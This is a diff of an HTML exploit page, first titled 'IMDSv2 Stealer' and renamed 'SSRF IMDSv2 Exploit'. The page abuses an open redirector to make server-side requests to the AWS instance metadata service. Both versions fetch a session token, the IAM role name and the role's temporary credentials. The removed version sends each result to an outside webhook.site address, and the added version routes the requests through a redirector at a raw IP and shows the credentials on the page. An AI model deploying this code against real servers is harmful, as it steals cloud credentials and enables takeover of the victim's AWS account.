@@ -1,60 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>IMDSv2 Stealer</title>
-</head>
-<body>
-  <h1>Fetching IMDSv2 credentials...</h1>
-  <script>
-    (async () => {
-      const redirector = '/redir.php?url=';
-      const webhook = 'https://webhook.site/565628b3-9556-8e01-88059325cb8d';
+<html>
+  <head>
+    <title>SSRF IMDSv2 Exploit</title>
+  </head>
+  <body>
+    <h1>Fetching IMDSv2 credentials...</h1>
 
-      try {
-        // בקשת הטוקן עם PUT
-        const tokenResp = await fetch(
-          redirector + encodeURIComponent('http://169.254.169.254/latest/api/token'),
-          {
+    <script>
+      const redirectorBase = 'https://13.221.230.104/redir.php?url=';
+
+      function fetchViaRedirector(url, options = {}) {
+        const targetUrl = redirectorBase + encodeURIComponent(url);
+        return fetch(targetUrl, options);
+      }
+
+      async function getIMDSv2Credentials() {
+        try {
+          const tokenRes = await fetchViaRedirector('http://169.254.169.254/latest/api/token', {
             method: 'PUT',
             headers: {
               'X-aws-ec2-metadata-token-ttl-seconds': '21600',
             },
-          }
-        );
-        const token = await tokenResp.text();
-        await fetch(webhook + '?step=token&value=' + encodeURIComponent(token));
+          });
 
-        // בקשת ה-role
-        const roleResp = await fetch(
-          redirector + encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
-          {
+          const token = await tokenRes.text();
+
+          const roleRes = await fetchViaRedirector('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
             headers: {
               'X-aws-ec2-metadata-token': token,
             },
-          }
-        );
-        const role = await roleResp.text();
-        await fetch(webhook + '?step=role&value=' + encodeURIComponent(role));
+          });
 
-        // בקשת credentials
-        const credsResp = await fetch(
-          redirector + encodeURIComponent('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role),
-          {
+          const role = await roleRes.text();
+
+          const credsRes = await fetchViaRedirector('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, {
             headers: {
               'X-aws-ec2-metadata-token': token,
             },
-          }
-        );
-        const creds = await credsResp.text();
-        await fetch(webhook + '?step=creds&value=' + encodeURIComponent(creds));
+          });
 
-        document.body.innerHTML += '<p style="color:green;">Credentials sent to webhook.site!</p>';
-      } catch (e) {
-        await fetch(webhook + '?step=error&value=' + encodeURIComponent(e.toString()));
-        document.body.innerHTML += '<p style="color:red;">Error: ' + e.toString() + '</p>';
+          const creds = await credsRes.text();
+          console.log('Credentials:', creds);
+
+          document.body.innerHTML += `<pre>${creds}</pre>`;
+        } catch (err) {
+          console.error('Error:', err);
+          document.body.innerHTML += `<p style="color:red">Failed: ${err}</p>`;
+        }
       }
-    })();
-  </script>
-</body>
+
+      getIMDSv2Credentials();
+    </script>
+  </body>
 </html>
